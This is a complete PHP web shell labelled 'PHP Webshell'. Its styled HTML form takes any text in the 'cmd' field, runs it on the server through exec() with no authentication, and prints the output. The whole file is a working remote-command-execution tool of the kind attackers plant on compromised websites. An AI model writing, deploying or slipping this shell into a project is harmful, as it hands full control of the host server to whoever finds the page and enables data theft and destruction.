<?php
$cmd = [];

if (isset($_POST['cmd'])) {
    exec($_POST['cmd'], $cmd);
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>PHP Webshell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #e8e9ed;
            margin: 0;
            padding: 30px;
            height: 100vh;
        }
        .form-container {
            background-color: #4F5B93;
            padding: 10px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 100%;
            color: #fff;
            box-sizing: border-box;
        }
        h2 {
            margin-top: 0;
        }
        label {
            display: block;
            margin: 10px 0 5px;
        }
        input[type="text"],
        textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            margin-left: 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            background-color: #fff;
            color: #000;
            box-sizing: border-box;
            resize: none;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #8993BE;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #7a86b6;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <form method="post">
            <label for="cmd">Command :</label>
            <input type="text" id="cmd" name="cmd" required><br><br>

            <label for="output">Output :</label>
            <textarea id="output" name="output" rows="20" readonly>
            <?php foreach ($cmd as $line): ?>
<?= trim($line) . "\n" ?>
            <?php endforeach; ?></textarea>

            <input type="submit" value="Execute">
        </form>
    </div>
</body>
</html>
